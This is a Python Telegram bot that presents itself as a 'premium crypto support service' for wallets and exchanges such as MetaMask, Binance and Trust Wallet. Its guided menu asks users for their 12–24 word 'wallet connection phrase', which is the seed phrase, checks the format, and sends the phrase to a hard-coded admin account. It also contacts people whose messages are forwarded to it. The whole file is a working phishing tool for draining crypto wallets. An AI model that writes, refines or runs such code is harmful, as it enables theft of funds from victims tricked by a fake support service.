import logging
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import re

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot token
from dotenv import load_dotenv
load_dotenv()  # Load environment variables from .env
TOKEN = os.environ.get("BOT_TOKEN")

# Admin ID
ADMIN_ID = 6244946735

# List of supported platforms with emojis
PLATFORMS = [
    ("Binance", "💰"),
    ("MetaMask", "🦊"),
    ("Trust Wallet", "🔒"),
    ("Coinbase", "🏦"),
    ("PancakeSwap", "🥞"),
    ("Uniswap", "🦄")
]

# List of issues with emojis
ISSUES = [
    ("Trading Issue ('Trading')", "📈"),
    ("Liquidity Pool Issue ('LP')", "💧"),
    ("Yield Farming Issue ('YF')", "🌾"),
    ("Initial Farm Offering Issue ('IFO')", "🚀"),
    ("Staking Issue ('Staking')", "🔗"),
    ("NFT Marketplace Issue ('NFT')", "🖼"),
    ("Lottery Issue ('Lottery')", "🎟"),
    ("Governance Issue ('Governance')", "🗳"),
    ("Wallet Connection Issue", "🔌"),
    ("Other Issue", "❓")
]

# Store user state
user_state = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # Reset user state
    user_state[user_id] = {"step": "await_consent"}
    keyboard = [[InlineKeyboardButton("🚀 Start Support", callback_data="start_support")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Welcome to @BlockchainSupport001, your premium crypto support service! "
        "Click below to begin resolving your issue:",
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "start_support":
        user_state[user_id] = {"step": "select_issue"}
        keyboard = [
            [InlineKeyboardButton(f"{emoji} {issue}", callback_data=f"issue_{i}")]
            for i, (issue, emoji) in enumerate(ISSUES)
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            "Please select the issue you're facing:",
            reply_markup=reply_markup
        )

    elif data.startswith("issue_"):
        issue_index = int(data.split("_")[1])
        user_state[user_id]["issue"] = ISSUES[issue_index][0]
        user_state[user_id]["step"] = "select_platform"
        keyboard = [
            [InlineKeyboardButton(f"{emoji} {platform}", callback_data=f"platform_{platform}")]
            for platform, emoji in PLATFORMS
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            f"You selected: {ISSUES[issue_index][0]}\nPlease select your cryptocurrency platform:",
            reply_markup=reply_markup
        )

    elif data.startswith("platform_"):
        platform = data.split("_")[1]
        user_state[user_id]["platform"] = platform
        user_state[user_id]["step"] = "input_phrase"
        await query.message.reply_text(
            f"You selected: {platform}\nPlease enter your wallet connection phrase (12-24 words, lowercase letters and numbers):"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id in user_state and user_state[user_id]["step"] == "input_phrase":
        # Validate phrase: 12-24 words, lowercase letters and numbers
        words = text.strip().split()
        if 12 <= len(words) <= 24 and all(re.match(r"^[a-z0-9]+$", word) for word in words):
            user_state[user_id]["phrase"] = text
            user_state[user_id]["step"] = "completed"
            # Notify user
            await update.message.reply_text(
                "✅ Thank you! Your request has been submitted. An agent will contact you shortly.\n"
                "Note: A commission may be charged for premium support services."
            )
            # Notify admin
            issue = user_state[user_id]["issue"]
            platform = user_state[user_id]["platform"]
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"📬 New support request:\nUser ID: {user_id}\nIssue: {issue}\nPlatform: {platform}\nPhrase: {text}"
            )
        else:
            await update.message.reply_text(
                f"❌ Invalid phrase: '{text}'. Must be 12-24 words, using only lowercase letters and numbers. Please try again."
            )
    else:
        # Prompt user to start if they send text without initiating
        keyboard = [[InlineKeyboardButton("🚀 Start Support", callback_data="start_support")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Please click below to start your support request:",
            reply_markup=reply_markup
        )

async def handle_forwarded_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.forward_from or update.message.forward_from_chat:
        user_id = update.message.forward_from.id if update.message.forward_from else update.message.forward_from_chat.id
        try:
            user_state[user_id] = {"step": "await_consent"}
            keyboard = [[InlineKeyboardButton("🚀 Start Support", callback_data="start_support")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await context.bot.send_message(
                chat_id=user_id,
                text="Hello! @BlockchainSupport001 has received your query from the channel. "
                     "Click below to start your premium support request:",
                reply_markup=reply_markup
            )
            await update.message.reply_text("✅ DM sent to the user.")
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to DM user: {str(e)}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

def main():
    if not TOKEN:
        logger.error("BOT_TOKEN environment variable not set")
        return
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.FORWARDED, handle_forwarded_message))
    application.add_error_handler(error_handler)
    application.run_polling()

if __name__ == "__main__":
    main()
